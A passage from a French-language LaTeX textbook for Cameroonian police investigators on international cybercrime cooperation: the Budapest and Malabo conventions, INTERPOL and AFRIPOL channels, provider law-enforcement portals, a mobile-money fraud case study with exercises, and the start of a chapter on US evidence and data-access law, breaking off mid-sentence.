\begin{tableaucours}{p{1.8cm}p{3.5cm}p{2.8cm}p{3.2cm}}{%
    \tableauHeader{Article} &
    \tableauHeader{Infraction} &
    \tableauHeader{Équiv. Loi~2010} &
    \tableauHeader{Cas typique Cameroun}
}
Art.~2 & Accès illégal & Art.~55 & Intrusion CNPS, système bancaire \\
Art.~3 & Interception illégale & Art.~56 & Logiciel espion C2 étranger \\
Art.~4 & Atteinte aux données & Art.~63 & Ransomware hôpital \\
Art.~5 & Atteinte au système & Art.~65 & DDoS infrastructure \\
Art.~6 & Abus de dispositifs & Art.~67 & Kit phishing vendu sur dark web \\
Art.~7 & Falsification & Art.~71 & Documents administratifs falsifiés \\
Art.~8 & Fraude informatique & Art.~78 & BEC, MoMo fraud, phishing \\
Art.~9 & CSAM & Art.~76 & Contenus pédopornographiques \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.2 --- Articles Budapest, équivalents camerounais
et cas typiques}\end{center}

% ============================================================================
\subsection{Les mesures procédurales~: articles~16, 17, 18 et 29}
% ============================================================================

Ces articles sont les plus directement utiles à l'enquêteur. Ils
définissent les outils d'investigation que chaque État doit mettre
à disposition et les mécanismes de coopération procédurale.

\begin{boxjuris}
\textbf{Article~16 --- Conservation rapide de données stockées~:}
\begin{quote}
\textit{[\ldots]} ordonner ou d'imposer \textit{[\ldots]} la conservation
rapide de données électroniques spécifiées \textit{[\ldots]} notamment
lorsqu'il y a des raisons de croire que celles-ci sont particulièrement
susceptibles de perte ou de modification. La période de conservation est
aussi longue que nécessaire, jusqu'à un maximum de 90~jours.
\end{quote}
\textbf{L'outil d'urgence n°~1 de l'enquêteur cyber.} Les données
numériques disparaissent vite~: logs effacés, comptes supprimés, serveurs
réinitialisés.\\[0.3ex]
\textbf{Conservation $\neq$ Divulgation~:} art.~16 préserve les données
(mise sous scellé numérique temporaire). La divulgation nécessite
art.~17--18. Ces deux étapes ne peuvent pas être sautées.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~29 --- Conservation urgente transfrontalière~:}
\begin{quote}
Une Partie peut demander à une autre Partie d'ordonner ou d'imposer
d'une autre façon la conservation rapide de données stockées au moyen
d'un système informatique situé sur le territoire de cette autre
Partie et pour lesquelles la Partie requérante souhaite présenter une
demande d'entraide en vue d'obtenir leur divulgation.
\end{quote}
\textbf{Réflexe obligatoire~:} dès qu'une adresse IP suspecte est
identifiée sur un serveur étranger, envoyer \emph{immédiatement} une
demande de conservation via le réseau 24/7 INTERPOL. Attendre la voie
diplomatique classique = arriver après effacement des données.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~35 --- Réseau 24/7~:}
Chaque Partie désigne un point de contact disponible 24h/24, 7j/7,
pour assister les autres Parties dans les investigations sur les
systèmes informatiques et les données stockées.\\[0.3ex]
Pour le Cameroun~: \textbf{BCN INTERPOL Yaoundé (DGSN/DCPJ)} est le
point de contact pour les demandes entrantes et sortantes via le réseau
I-24/7.
\end{boxjuris}

\begin{boxCRO}
\textbf{Analyse CRO --- Article~29 et conservation urgente}

$\mathcal{R}$ (Fiabilité)~: la conservation urgente préserve les données
avant qu'elles ne disparaissent --- elle maximise la fiabilité future
du dossier.

$\mathcal{O}$ (Opposabilité)~: art.~29 fonde légalement la demande~;
sans cette base, les données obtenues peuvent être contestées comme
ayant été recueillies sans fondement.

$\mathcal{C}$ (Confidentialité)~: la conservation implique que le
fournisseur étranger a connaissance de l'investigation. Dans certains
cas, cela peut alerter le suspect (via compromission du fournisseur).

\cro{$\downarrow$ risque à évaluer}{$\uparrow\uparrow$ conservation = intégrité future}{$\uparrow\uparrow$ base légale solide}
\end{boxCRO}

% ============================================================================
\section{La Convention de Malabo~: Réponse Africaine}
\label{sec:malabo}
% ============================================================================

\subsection{Contexte et entrée en vigueur}

La \termecle{Convention de Malabo}\index{Malabo, Convention de} (Convention
de l'Union Africaine sur la cybersécurité et la protection des données
personnelles) a été adoptée le 27~juin~2014 et est entrée en vigueur
le 8~juin~2023, après sa 15\textsuperscript{e} ratification.
En~2026, environ 15--16~États africains l'ont ratifiée.

Contrairement à Budapest (purement pénale), Malabo est une convention
\textbf{trifonctionnelle}~: elle couvre simultanément le commerce
électronique (Chap.~II), la protection des données personnelles
(Chap.~III) et la cybercriminalité (Chap.~V).

\subsection{Infractions spécifiques à Malabo}

Par rapport à Budapest, Malabo ajoute trois infractions absentes~:

\begin{itemize}
    \item \textbf{Usurpation d'identité (art.~V-41)}~: ABSENTE de Budapest.
          Malabo criminalise spécifiquement l'usurpation d'identité en
          ligne. Directement applicable~: SIM~swapping, faux profils
          Facebook, phishing par usurpation de marque.
    \item \textbf{Cyberterrorisme (art.~V-42)}~: actes terroristes via
          les TIC ou ciblant des infrastructures critiques. Pertinent
          pour les menaces Boko~Haram utilisant les réseaux sociaux.
    \item \textbf{Cybersquatting (art.~V-46)}~: enregistrement de noms
          de domaine imitant des marques ou institutions de mauvaise foi~;
          faux sites imitant les banques camerounaises, administrations,
          opérateurs Mobile Money.
\end{itemize}

\subsection{Tableau comparatif Budapest / Malabo}

\begin{tableaucours}{p{3.5cm}p{4.5cm}p{4.5cm}}{%
    \tableauHeader{Critère} &
    \tableauHeader{Budapest (2001)} &
    \tableauHeader{Malabo (2014)}
}
Origine & Conseil de l'Europe & Union Africaine \\
Portée & Mondiale (ouverte à tous) & Africaine (membres UA) \\
États parties (2026) & $\approx$~68 & $\approx$~15--16 \\
Entrée en vigueur & 1\textsuperscript{er} juillet~2004 & 8~juin~2023 \\
Infractions spécif. & Art.~2--11 + CSAM + droit d'auteur &
    Idem + usurpation identité + cyberterrorisme + cybersquatting \\
Protection données & Absente (couverte par Convention~108) &
    Intégrée (Chap.~III complet) \\
Commerce électronique & Absent & Intégré (Chap.~II) \\
Coopération & Réseau 24/7 (art.~35), MLAT, art.~29 & AFRIPOL~; moins formalisé \\
Force contraignante & Élevée~; jurisprudence abondante &
    Plus faible~; texte récent, peu de pratique \\
Position Cameroun & Non signataire --- influence via Loi~2010 &
    Signataire non-ratifiant (juin~2026) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.3 --- Comparaison Budapest / Malabo}\end{center}

\begin{boiteRemarque}{Règles de choix entre Budapest et Malabo}
\begin{enumerate}
    \item Utiliser toujours le texte que l'État requis a ratifié.
    \item Si l'État requis a ratifié les deux~$\to$ Budapest en priorité
          (plus de pratique, mécanismes plus rodés).
    \item Si l'État requis a ratifié Malabo mais pas Budapest
          (ex.~: Angola)~$\to$ Malabo Chap.~V.
    \item Si l'État requis n'a ratifié ni l'un ni l'autre~$\to$
          accords bilatéraux ou canal INTERPOL/AFRIPOL.
    \item Vérification obligatoire avant toute demande~:
          \texttt{treaty.un.org} (Budapest) et \texttt{au.int} (Malabo).
\end{enumerate}
\end{boiteRemarque}

% ============================================================================
\section{Les Protocoles Additionnels de Budapest}
\label{sec:protocoles-budapest}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Protocole} &
    \tableauHeader{Objet} &
    \tableauHeader{Impact opérationnel}
}
\textbf{Protocole~I} (STE~189, 2003) &
    Contenus racistes et xénophobes &
    35~États. USA non-signataire.
    Demandes difficiles vers les USA pour ce type de contenu. \\
\textbf{Protocole~II} (STE~224, 2022,
    en vigueur~2024) &
    Accès élargi aux données stockées dans le cloud &
    Délai 45--90~jours vs 18~mois pour MLAT classique.
    Révolutionne la forensique cloud transfrontalière. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.4 --- Protocoles additionnels Budapest}\end{center}

Le Protocole~II est particulièrement important~: il crée une procédure
accélérée pour accéder aux données cloud détenues par des fournisseurs
dans les États parties. Pour la forensique cloud, il représente un
changement de paradigme~: délais de mois réduits à semaines.

% ============================================================================
\section{INTERPOL et AFRIPOL~: Architecture de la Coopération}
\label{sec:interpol-afripol}
% ============================================================================

\subsection{INTERPOL --- réseau mondial}

\begin{tableaucours}{p{3.5cm}p{8.0cm}}{%
    \tableauHeader{Composante} &
    \tableauHeader{Description}
}
Structure & 195~pays membres. Siège~: Lyon. Bureau régional Afrique
    centrale~: Yaoundé. Direction Cybercriminalité~: Singapour (IGCI). \\
Réseau I-24/7 & Réseau mondial sécurisé entre les 195~BCN.
    Accessible uniquement via le BCN national
    (DGSN pour le Cameroun). \\
Notices & 7~types~: \textbf{Rouge} (arrestation), \textbf{Bleue}
    (renseignements), Verte (avertissement), Mauve (modes opératoires),
    Orange (menaces), Jaune (disparitions), Noire (cadavres). \\
Opérations récentes & HAECHI~I--IV (fraudes en ligne Asie)~;
    FALCON~I--II (cybercriminels africains, Cameroun participant)~;
    GOLDFISH~ALPHA (malwares routeurs). \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.5 --- Architecture INTERPOL cyber}\end{center}

\subsubsection*{Procédure d'activation du réseau 24/7}

\begin{tableaucours}{p{3.5cm}p{8.0cm}}{%
    \tableauHeader{Paramètre} &
    \tableauHeader{Détail}
}
Qui peut activer~? &
    Tout OPJ, via la chaîne hiérarchique~$\to$ BCN Cameroun
    (DGSN/DCPJ)~$\to$ réseau I-24/7. Impossible de bypasser le BCN. \\
Types de demandes &
    Conservation urgente (art.~29 Budapest), identification IP,
    identification abonné, localisation suspect. \\
Délais moyens &
    Conservation~: 24--48h. Identification IP~: 48--72h.
    Identification abonné~: 72h--7~jours. \\
Format &
    Fiche INTERPOL standardisée (disponible au BCN). Minimum~:
    infraction, données à identifier, urgence motivée, coordonnées
    de contact. \\
Suivi &
    Toujours noter un numéro de référence interne. Relancer après
    48h sans réponse. Urgence vitale~: appel téléphonique direct
    au BCN du pays requis. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.6 --- Procédure réseau 24/7 INTERPOL}\end{center}

\subsection{AFRIPOL --- coopération africaine}

\termecle{AFRIPOL}\index{AFRIPOL} est le mécanisme de coopération policière
de l'Union Africaine~: opérationnel depuis 2014, siège à Alger, unité
Cybercriminalité créée en~2017.

\begin{itemize}
    \item \textbf{Opération FALCON~I (2021)}~: 11~pays africains~;
          11~cybercriminels arrêtés (groupe SilverTerrier, Nigeria)~;
          50~000~appareils infectés identifiés.
    \item \textbf{Opération FALCON~II (2022)}~: 14~pays africains
          \textbf{dont le Cameroun}~; ciblage des réseaux BEC et
          phishing transfrontaliers.
    \item \textbf{Avantage comparatif}~: meilleure compréhension du
          contexte africain, moins de barrières culturelles. Utiliser
          en complément d'INTERPOL, pas à sa place.
\end{itemize}

% ============================================================================
\section{Les MLAT et les Portails LEA}
\label{sec:mlat-lea}
% ============================================================================

\subsection{La règle d'or~: conservation avant divulgation}

\begin{boxalert}
\textbf{RÈGLE D'OR --- CONSERVATION AVANT TOUT}
\begin{enumerate}
    \item \textbf{Conservation IMMÉDIATE} --- réseau 24/7 INTERPOL /
          portail LEA urgence --- délai cible~: 24--72h.
    \item \textbf{Qualification + instrument} --- Budapest / Malabo /
          accord bilatéral applicable.
    \item \textbf{MLAT formel} --- dans les 60~jours --- pour obtenir
          les données avec valeur probatoire opposable en tribunal.
\end{enumerate}
\textbf{Erreur fatale~:} attendre le MLAT pour demander la conservation.
Le MLAT prend 3~semaines à 18~mois. Les données volatiles disparaissent
en heures.
\end{boxalert}

\subsection{Les portails LEA des grands fournisseurs}

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{3.0cm}p{2.5cm}}{%
    \tableauHeader{Fournisseur} &
    \tableauHeader{Portail} &
    \tableauHeader{Données disponibles} &
    \tableauHeader{Délais}
}
\textbf{Meta} (FB, IG, WA) &
    \texttt{facebook.com/records/login} &
    Abonné, logs, IP connexion. Contenu messages~: MLAT USA. &
    Standard~: 7--21j. Urgence~: 24--72h. \\
\textbf{Google} (Gmail, YT, Android) &
    \texttt{support.google.com/legal} &
    Abonné Gmail, localisation Android (précise). Contenu~: MLAT. &
    Standard~: 10--30j. Urgence~: 24--48h. \\
\textbf{Microsoft} (Outlook, OneDrive) &
    \texttt{microsoft.com/legal/lerp} &
    Abonné, historique connexion. Contenu~: MLAT. &
    Le plus réactif aux demandes étrangères. \\
\textbf{TikTok} &
    \texttt{tiktok.com/legal/law-enforcement} &
    Abonné, activité. &
    Standard~: 14--30j. \\
\textbf{Telegram} &
    (portail limité) &
    Répond rarement sans ordonnance. &
    Privilégier MLAT. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.7 --- Portails LEA des grands fournisseurs}\end{center}

\begin{boxPNC}
\textbf{WhatsApp~: limite technique irréductible}

Le chiffrement de bout en bout d'WhatsApp signifie que Meta \emph{ne peut
pas} fournir le contenu des messages, même avec une ordonnance. Accessible
via portail LEA~: uniquement les métadonnées (qui a communiqué avec qui,
quand, durée). Le contenu des messages nécessite un MLAT USA --- et même
alors, Meta ne peut fournir que ce qu'elle stocke (métadonnées).

\textbf{Alternative pratique~:} saisir physiquement le téléphone du suspect
et acquérir les messages via ADB (si téléphone déverrouillé) --- la donnée
est sur l'appareil, pas chez Meta.
\end{boxPNC}

% ============================================================================
\section{Tableau de Décision~: Quel Canal pour Quelle Demande~?}
\label{sec:tableau-decision}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{4.5cm}p{4.0cm}}{%
    \tableauHeader{Situation} &
    \tableauHeader{Protocole d'action} &
    \tableauHeader{Délais et remarques}
}
Urgence vitale (menace de mort, CSAM actif) &
    1.~Portail LEA urgent (24--72h). 2.~BCN INTERPOL 24/7.
    3.~Conservation urgente art.~29. &
    Agir immédiatement. Ne pas attendre l'autorisation
    judiciaire formelle pour la conservation. \\
Données volatiles (IP suspecte, logs) &
    1.~\emph{IMMÉDIATEMENT}~: conservation BCN INTERPOL.
    2.~Portail LEA en parallèle. 3.~MLAT dans les 60~jours. &
    Conservation = réflexe~n°~1. Tout le reste peut attendre. \\
Identification IP étrangère &
    1.~WHOIS (pays propriétaire). 2.~Si Budapest~: réseau 24/7 BCN.
    3.~Réquisition FAI camerounais si IP de transit. &
    48h--7j. FAI européens/américains~: conservation 6~mois--1~an. \\
Compte réseau social &
    1.~Portail LEA fournisseur. 2.~Urgence~: cocher Emergency.
    3.~BCN INTERPOL si délai insuffisant. &
    Abonné~: 7--30j. Urgence~: 24--72h. Contenu~: MLAT (mois). \\
Gel de fonds crypto &
    1.~Identifier plateforme et pays. 2.~GABAC~$\to$ GIABA.
    3.~Demande gel via canaux financiers. &
    Plateformes légales~: obligations AML/KYC.
    Bitcoin~: analyse blockchain via Blockchair. \\
État africain signataire Malabo &
    1.~Vérifier ratification (au.int). 2.~Citer Malabo Chap.~V.
    3.~AFRIPOL si nécessaire. &
    En cas de doute~: contacter AFRIPOL directement. \\
État non-signataire Budapest/Malabo &
    1.~Accords bilatéraux. 2.~Canal INTERPOL hors Budapest.
    3.~Chercher nœuds de la chaîne dans des pays coopérants. &
    Russie, Chine~: coopération limitée. Chercher les nœuds
    intermédiaires dans des pays plus accessibles. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.8 --- Tableau de décision~: canal selon la situation}\end{center}

% ============================================================================
\section{Cas Pratique~: Opération BAOBAB}
\label{sec:baobab}
% ============================================================================

\begin{boxscenario}{Opération BAOBAB --- Fraudes MoMo transfrontalières}
\textbf{Contexte~:} Fraudes MTN MoMo~: 47~millions FCFA détournés
en 3~mois sur 23~victimes camerounaises. Les fonds ont été transférés
vers un compte Binance, convertis en Bitcoin et envoyés vers une adresse
dont la dernière connexion provient d'une IP sénégalaise
(\texttt{41.82.XXX.XXX} --- Sonatel).

\textbf{Données disponibles~:}
\begin{enumerate}
    \item IP de connexion au compte Binance.
    \item Email du compte Binance.
    \item Adresse Bitcoin de destination.
    \item Dates et montants de toutes les transactions MTN MoMo.
\end{enumerate}

\textbf{Trois actions simultanées~:}
\end{boxscenario}

\begin{tableaucours}{p{3.2cm}p{5.0cm}p{4.0cm}}{%
    \tableauHeader{Action} &
    \tableauHeader{Description} &
    \tableauHeader{Base légale et délai}
}
\textbf{Action~1} --- Conservation Binance &
    Demande de conservation urgente~: données d'abonne, logs,
    transactions. Via portail LEA Binance + BCN INTERPOL. &
    Art.~16/29 Budapest si État partie~; portail LEA. Cible~: 48h. \\
\textbf{Action~2} --- Identification IP Sénégal &
    Demande d'entraide urgente vers Sonatel pour identification
    de l'abonné de l'IP sénégalaise. &
    Art.~29 Budapest (Sénégal est partie). BCN Sénégal. 7--14~jours. \\
\textbf{Action~3} --- Analyse blockchain &
    Tracer l'adresse Bitcoin de destination. Identifier les transferts
    ultérieurs et les plateformes d'échange. &
    \texttt{Blockchair.com} (gratuit, public). Résultat immédiat. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.9 --- Opération BAOBAB~: trois actions simultanées}\end{center}

\begin{boxalert}
\textbf{Erreurs les plus fréquentes dans cet exercice~:}
\begin{enumerate}
    \item Envoyer directement une demande de divulgation sans conservation
          préalable~: les données sont effacées avant réponse.
    \item Ne pas citer la base légale dans la demande~: une demande sans
          base légale est systématiquement renvoyée.
    \item Adresser la demande directement à Sonatel sans canal officiel~:
          une demande directe à un opérateur étranger sans voie officielle
          a peu de chances d'aboutir rapidement.
\end{enumerate}
\end{boxalert}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item Le Cameroun \textbf{n'est pas signataire de Budapest} mais la
          Loi~2010/012 en est directement issue~: les deux textes sont
          alignés. Maîtriser Budapest comme si le Cameroun en était partie.

    \item \textbf{Articles Budapest à retenir~:} art.~2 (accès illégal)~;
          art.~8 (fraude~: le plus utilisé)~; art.~16 (conservation
          nationale~: 90~jours max)~; art.~29 (conservation urgente
          transfrontalière~: réflexe~n°~1)~; art.~35 (réseau 24/7).

    \item \textbf{Malabo} ajoute trois infractions absentes de Budapest~:
          usurpation d'identité, cyberterrorisme, cybersquatting. Moins
          de pratique mais adapté à la réalité africaine.

    \item \textbf{Règle d'or}~: Conservation~$\to$ Qualification~$\to$
          MLAT (dans cet ordre, toujours). Ne jamais attendre le MLAT
          pour demander la conservation.

    \item \textbf{Portails LEA}~: Meta/Google/Microsoft permettent
          d'obtenir les données d'abonné en 24h--30j. Le contenu des
          messages nécessite toujours un MLAT.

    \item \textbf{INTERPOL réseau 24/7}~: accessible via le BCN
          Cameroun (DGSN). Délais~: 24--48h pour conservation,
          48--72h pour identification IP.

    \item \textbf{Le tableau de décision} (Tableau~10.8) est le mémo
          opérationnel~: une ligne par situation, trois colonnes~:
          protocole, canal, délai.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~10.1 --- Qualification internationale \niveaubase}]
Pour chacune des situations suivantes, identifiez~: (A)~l'article Budapest
applicable, (B)~l'article équivalent de la Loi~2010/012, (C)~une divergence
éventuelle et ses conséquences pratiques~:
\begin{enumerate}[(a)]
    \item Un groupe de hackers depuis le Nigeria a accédé au système de
          gestion des marchés publics camerounais et modifié des données
          d'attribution.
    \item Un ressortissant sénégalais a intercepté les communications
          d'un dirigeant d'entreprise camerounais via un logiciel espion.
    \item Un réseau distribué dans 12~pays envoie 4~millions de faux
          emails au nom d'UBA Cameroun, récoltant les identifiants
          bancaires de 3~000~victimes.
    \item Un site web hébergé en Côte~d'Ivoire imite fidèlement le portail
          de Mobile Money de MTN Cameroun pour voler les identifiants.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~10.2 --- Choix de canal \niveaumoyen}]
Pour chacun des 6~scénarios suivants, identifiez le canal de coopération
à activer en premier, la base légale applicable, et le délai attendu~:
\begin{enumerate}[(a)]
    \item Serveur de phishing bancaire hébergé aux Pays-Bas (Budapest).
    \item Compte Facebook d'un harceleur identifié au Sénégal
          (Budapest + Malabo).
    \item Fonds blanchis sur Orange Money Côte~d'Ivoire (Malabo ratifié).
    \item Serveur C2 de logiciel espion situé en Russie
          (non-Budapest, non-Malabo).
    \item Vidéo terroriste Boko~Haram sur YouTube (serveurs USA).
    \item Contenu CSAM sur Telegram.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~10.3 --- Rédaction de demande de conservation \niveauexpert}]
Dans l'Opération WOURI (Chapitre~\ref{chap:gr-affaires}), vous avez
identifié~: l'IP \texttt{91.XXX.XX.XX} (enregistrée aux Pays-Bas) comme
origine de l'email de phishing~; un compte Binance utilisé pour le
blanchiment~; une adresse Bitcoin liée à des transactions vers un exchange
aux Émirats arabes unis (Budapest-ratifié depuis 2021).

\begin{enumerate}[(a)]
    \item Rédigez la demande de conservation urgente selon art.~29 Budapest
          pour l'IP néerlandaise~: base légale, nature de l'infraction,
          données demandées, urgence motivée, délai demandé.
    \item Quels sont les trois éléments \emph{sans lesquels} la demande
          sera systématiquement rejetée~?
    \item Appliquez la grille CRO à la décision d'activer simultanément
          les trois canaux (Pays-Bas, Binance, EAU)~: quels risques
          pour $\mathcal{C}$ et comment les gérer~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:leg-monde} approfondit la
\textbf{législation mondiale comparative}~: RGPD, CLOUD~Act, NIS~2 en
Europe~; CCPA aux États-Unis~; PIPL en Chine. Ces législations
conditionnent directement la coopération internationale~: savoir ce que
le droit local d'un État partenaire autorise ou interdit est
indispensable pour formuler des demandes qui aboutissent.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie3/P03_C11_legislation_mondiale.tex
% Titre    : Législation Mondiale et Régionale
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : 13_legislation_mondiale_regionale.tex (squelette FRE/SCA/CFAA/
%            RGPD/Budapest/Malabo/CEDEAO/SADC/EAC)
%            M4_Cadre_Normatif_International_PNC.docx (CLOUD Act, Protocole II,
%            comparatif, coopération)
% Positionnement : Ch. 10 = cadre normatif global (Budapest, Malabo, INTERPOL).
%                  Ce chapitre = impact forensique du droit de CHAQUE grande
%                  juridiction sur les investigations camerounaises.
%                  Question directrice : quand les OPJ requis-itionnent un
%                  fournisseur ou coopèrent avec un partenaire, quel droit
%                  local s'applique chez eux, et qu'est-ce que ça change ?
% ============================================================================

\chapter{Législation Mondiale et Régionale}
\label{chap:leg-mond}

\epigraph{%
    « Cybercrime knows no borders, but our laws still do.
    International cooperation is not just desirable --- it's imperative. »%
}{--- Susan W. Brenner}

\niveauChapitre{Fondamental}{%
    Lecture des Chapitres~\ref{chap:norm-glob} (Cadre normatif global)
    recommandée~: ce chapitre examine les droits nationaux que le
    Chapitre~10 ne couvre pas directement.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre le droit américain applicable aux investigations
          impliquant des fournisseurs US~: FRE, SCA, CFAA, CLOUD~Act.
    \item Identifier les tensions entre RGPD européen et investigation
          forensique, et comprendre comment les résoudre en pratique.
    \item Maîtriser eIDAS et NIS~2~: leur impact sur la valeur probatoire
          des preuves numériques et la sécurité des systèmes.
    \item Connaître les cadres régionaux africains~: CEDEAO, SADC, EAC
          et leur utilité opérationnelle pour les OPJ camerounais.
    \item Appliquer une grille de lecture comparative pour choisir
          la stratégie juridique optimale dans une affaire transfrontalière.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Question directrice de ce chapitre}
% ============================================================================

Quand un OPJ camerounais réquisitionne Google pour les emails d'un suspect,
c'est le droit américain qui s'applique chez Google, pas le droit camerounais.
Quand des preuves proviennent d'un serveur hébergé en Allemagne, c'est le RGPD
qui contraint le fournisseur. Quand un partenaire sénégalais coopère sur une
affaire transfrontalière, c'est leur propre cadre législatif qui détermine ce
qu'ils peuvent partager.

Ce chapitre répond à une question pratique~: \emph{quel droit local s'applique
chez quel partenaire, et qu'est-ce que cela change concrètement pour mes
demandes et mes preuves~?}

\separateur

% ============================================================================
\section{Droit Américain~: le Cadre des Grands Fournisseurs}
\label{sec:droit-usa}
% ============================================================================

Les plus grands fournisseurs de services numériques mondiaux --- Google,
Meta, Microsoft, Amazon, Apple --- sont des entreprises américaines soumises
au droit fédéral des États-Unis. Comprendre ce droit n'est pas une option
académique~: c'est la condition pour formuler des demandes qui aboutissent.

\subsection{Federal Rules of Evidence (FRE)~: admissibilité aux États-Unis}

Les \termecle{Federal Rules of Evidence}\index{Federal Rules of Evidence}
(FRE) régissent l'admissibilité des preuves devant les juridictions fédérales
américaines. Deux règles sont particulièrement importantes pour la forensique
numérique internationale~:

\begin{boxjuris}
\textbf{FRE Rule~901 --- Authentication~:}
\begin{quote}
To satisfy the requirement of authenticating or identifying an item of
evidence, the proponent must produce evidence sufficient to support a finding
that the item is what the proponent claims it is.
\end{quote}
\textbf{Application numérique~:} les hash SHA-256 sont acceptés comme preuve
d'authenticité~; la chaîne de custody doit être documentée~; le témoignage
d'un expert est souvent requis pour expliquer les méthodes forensiques.
MD5 est considéré \emph{deprecated} pour les nouveaux dossiers.
\end{boxjuris}

\begin{boxjuris}
\textbf{FRE Rule~803(6) --- Business Records Exception~:}
Les enregistrements de routine d'une entreprise (logs système, emails
conservés, transactions financières) sont admissibles même sans témoignage
direct si~: (1)~ils ont été créés dans le cours normal des affaires~;
(2)~ils ont été conservés selon les procédures habituelles de l'entreprise~;
(3)~un représentant qualifié en atteste.\\[0.3ex]
\textbf{Impact forensique~:} les réponses aux réquisitions LEA de Meta ou
Google constituent des ``business records'' --- elles sont directement
admissibles selon cette règle devant les tribunaux américains, et leur
valeur probatoire est reconnue dans la plupart des juridictions francophones
par réciprocité.
\end{boxjuris}

\subsection{Stored Communications Act (SCA)~: protection et accès}

Le \termecle{Stored Communications Act}\index{SCA} (SCA, 18~U.S.C.
\S\S~2701--2712) protège les communications électroniques stockées par des
tiers. Il régit ce que les fournisseurs américains \emph{peuvent} et
\emph{doivent} communiquer aux forces de l'ordre.

\begin{tableaucours}{p{3.5cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Type de données} &
    \tableauHeader{Instrument requis} &
    \tableauHeader{Impact pour les OPJ camerounais}
}
Données d'abonné de base (nom, adresse, facturation) &
    Administrative subpoena &
    Accessibles via portail LEA sur simple réquisition~;
    délai~: 7--21~jours \\
Adresses IP de connexion, logs de session &
    Court order (18~U.S.C.~\S~2703(d)) &
    Portail LEA~; urgence~: 24--72h~; standard~: 7--30j \\
Contenu des communications (emails, messages) &
    Search warrant (mandat de perquisition) &
    \textbf{MLAT USA obligatoire}~; délai~: 6--18~mois~;
    Protocole~II Budapest peut réduire ce délai (si ratifié) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~11.1 --- SCA~: instruments selon le type de données}\end{center}

\begin{boiteRemarque}{Pourquoi les portails LEA ne donnent pas le contenu des emails}
Le SCA interdit aux fournisseurs américains de communiquer le contenu des
communications sans warrant (mandat de perquisition), même à des autorités
étrangères. Ce n'est pas un refus de coopérer --- c'est une obligation
légale. La seule voie légale pour obtenir le contenu est le MLAT ou le
Protocole~II Budapest (si l'État requis l'a ratifié). Reformuler la demande
en ciblant les métadonnées (admissibles sans warrant) est souvent la
stratégie plus rapide et suffisante.
\end{boiteRemarque}

\subsection{Computer Fraud and Abuse Act (CFAA)~: base des poursuites US}

Le \termecle{CFAA}\index{CFAA} (18~U.S.C.~\S~1030) définit les infractions
informatiques fédérales américaines. Bien que principalement applicable aux
faits commis sur le sol américain, il importe à deux titres~:

\begin{enumerate}
    \item \textbf{Base de coopération}~: quand l'OPJ camerounais demande
          une entraide aux États-Unis, la demande doit démontrer que les
          faits constituent une infraction dans les deux pays
          (\textit{double incrimination}). Montrer que les faits tombent
          sous le CFAA \emph{et} sous la Loi~2010/012 renforce la demande.
    \item \textbf{Compétence extraterritoriale}~: le CFAA s'applique quand
          une infrastructure américaine est visée ou utilisée --- même si
          l'auteur et la victime sont à l'étranger. Un attaquant nigérian
          ciblant une banque camerounaise via des serveurs Amazon peut être
          poursuivi aux États-Unis.
\end{enumerate}

\begin{tableaucours}{p{3.5cm}p{3.0cm}p{5.0cm}}{%
    \tableauHeader{Infraction CFAA} &
    \tableauHeader{Peine max.} &
    \tableauHeader{Équivalent Loi~2010/012}
}
Accès non autorisé à un ordinateur protégé &
    1--10~ans &
    Art.~55 (accès illicite) \\
Accès avec obtention d'information &
    1--10~ans &
    Art.~55 + Art.~78 si préjudice \\
Dommages intentionnels (ransomware) &
    10~ans (1\textsuperscript{re} offense) &
    Art.~63 (atteinte aux données) \\
Fraude informatique &
    5--20~ans &
    Art.~78 (fraude informatique) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~11.2 --- CFAA et équivalents Loi~2010/012}\end{center}

\subsection{CLOUD Act~: accès transfrontalier aux données}

Le \termecle{CLOUD Act}\index{CLOUD Act} (\textit{Clarifying Lawful Overseas
Use of Data Act}, 2018) est la loi la plus controversée dans le domaine de
la coopération numérique internationale. Elle détermine les obligations
des entreprises américaines vis-à-vis des demandes étrangères.

\begin{boxCRO}
\textbf{Analyse CRO --- CLOUD Act}

$\mathcal{R}$ (Fiabilité)~: le CLOUD~Act permet aux autorités américaines
d'accéder aux données stockées par des entreprises US \emph{n'importe où
dans le monde}, indépendamment du pays de stockage. Pour la forensique~:
les preuves obtenues via CLOUD~Act ont une valeur probatoire élevée car
elles sont certifiées par l'entreprise américaine.

$\mathcal{O}$ (Opposabilité)~: les données obtenues via CLOUD~Act sont
admissibles devant les tribunaux américains selon FRE~803(6), et
généralement reconnues par réciprocité dans les pays partenaires.

$\mathcal{C}$ (Confidentialité)~: \textbf{tension majeure.} Le CLOUD~Act
